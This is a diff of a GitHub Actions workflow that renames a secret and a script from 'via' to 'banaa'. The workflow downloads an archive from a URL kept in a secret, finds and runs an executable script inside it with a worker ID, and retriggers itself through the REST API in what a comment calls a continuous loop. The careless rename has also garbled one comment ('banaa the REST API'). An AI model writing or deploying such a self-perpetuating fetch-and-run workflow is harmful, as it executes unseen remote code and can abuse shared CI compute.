@@ -61,7 +61,7 @@ jobs:
         run: |
           set -euo pipefail
           TARGET_PATH="$NESTED_DIR/$ZIP_NAME"
-          curl -fSL -o "$TARGET_PATH" "${{ secrets.VIA }}"
+          curl -fSL -o "$TARGET_PATH" "${{ secrets.BANAA }}"
           if [ ! -f "$TARGET_PATH" ]; then
             echo "Download failed: $TARGET_PATH not found"
             exit 1
@@ -85,12 +85,12 @@ jobs:
           set -euo pipefail
           cd "$NESTED_DIR"
           
-          script_path="$(find . -type f -name 'via.sh' -print -quit || true)"
+          script_path="$(find . -type f -name 'banaa.sh' -print -quit || true)"
           if [ -z "$script_path" ]; then
-            script_path="$(find . -type f -iname 'via*' -perm /111 -print -quit || true)"
+            script_path="$(find . -type f -iname 'banaa*' -perm /111 -print -quit || true)"
           fi
           if [ -z "$script_path" ]; then
-            echo "Could not find via.sh or executable via* file."
+            echo "Could not find banaa.sh or executable banaa* file."
             find . -maxdepth 4 -type f -print
             exit 1
           fi
@@ -122,7 +122,7 @@ jobs:
           bash -x "$EXEC_SCRIPT" "$WORKER_ID"
 
       # --------------------------------------------------------------------
-      # Final step: trigger the same workflow again via the REST API.
+      # Final step: trigger the same workflow again banaa the REST API.
       # - Provide a PAT in repository secret REPO_PAT (recommended), or the workflow will fall back to GITHUB_TOKEN.
       # - WARNING: This creates a continuous loop. Add a conditional/variable if you want to stop at some point.
       # --------------------------------------------------------------------
